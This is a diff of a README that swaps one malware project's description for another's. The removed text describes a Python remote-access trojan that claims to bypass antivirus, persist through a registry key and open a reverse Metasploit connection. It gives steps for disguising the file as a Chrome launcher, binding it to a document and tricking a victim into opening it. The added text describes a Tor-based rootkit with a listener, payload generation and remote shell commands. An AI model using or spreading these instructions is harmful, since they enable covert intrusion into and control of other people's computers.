@@ -1,35 +1,41 @@
-Python-Rootkit
-This is a full undetectable python RAT which can bypass almost all antivirus and open a backdoor inside any windows machine which will establish a reverse https Metasploit connection to your listening machine.
+tor-rootkit
+Docker build test Windows & Linux executables
 
-ViRu5 life cycle
-Bypass all anti-virus.
-Inject a malicius powershell script into memory.
-Establish a reverse https connection to attacker machine.
-Check every 10 seconds and make sure that the connection is still exist, If not it will re-establish a new connection.
-Add a startup register key to re-connect to attacker after reboot.
-Steps
-Update viRu5/source.py parameters with your lhost and lport
-Change source.py name to GoogleChromeAutoLaunch.py
-Add GoogleChromeAutoLaunch.py, setup.py and your icon as icon.ico to c:\python27 dir
-From cmd do
-cd c:\python27
-python setup.py py2exe
-Find the RAT exe file in Dist dir.
-Blind it with any photo, pdf, word or any kind of files
-Send it to the victim
-Use your social engineer skills to make him open the file
-You will recieve a reverse https metasoplit connection :)
-Testing on
-Windows 7 32bit
-Winodws 7 64bit
-Widowns 8 32bit
-Windows 8 64bit
-Windows 8.1 32bit
-Windows 8.1 64 bit
-Windows 10 32bit
-Windows 10 64bit
-Thanks
-Thanks for every security researsher how spend a time to help peaple and make the community more powerfull. Thanks for powerShellEmpire guys.
+A Python 3 standalone Windows 10 / Linux Rootkit. The networking communication get's established over the tor network.
+
+This rootkit is WIP.
 
 Disclaimer
-This is for Educational purposes ONLY. First of all, this code aims to alarm people about security issues infected unpatched machines.
+Use for educational purposes only.
+
+How to use
+Clone the repo and change directory:
+git clone https://github.com/emcruise/tor-rootkit.git
+cd ./tor-rootkit
+Build docker container:
+docker build -t listener .
+Run docker container:
+docker run -v $(pwd)/executables:/executables/ -it listener
+Deploy the executables: When the listener is up and running it generates a "executables" directory containing different payloads for different plattforms.
+tor-rootkit/
+│    ...
+└    executables/
+Note: The client can take some time to connect because PyInstaller executables are a bit slower and it need's to start tor.
+
+Features
+Standalone executables for Windows and Linux, including python interpreter and tor
+the whole communication works over tor hidden services which guarantees some degree of anonymity
+The Listener can handle multiple clients
+The Listener generates payloads for different platforms on startup
+Listener Shell Commands
+Command	Explanation
+help	Shows the help menu
+^C or exit	Exits the shell
+list	lists all connected clients with their according index
+select <index>	start shell with client
+Client Shell Commands
+Command	Explanation
+help	Shows the help menu
+^C or exit	Exits the client shell and returns to listener shell
+os <command>	Executes a command in the clients shell and returns the output
+background	Keeps the connection to a client and returns to listener
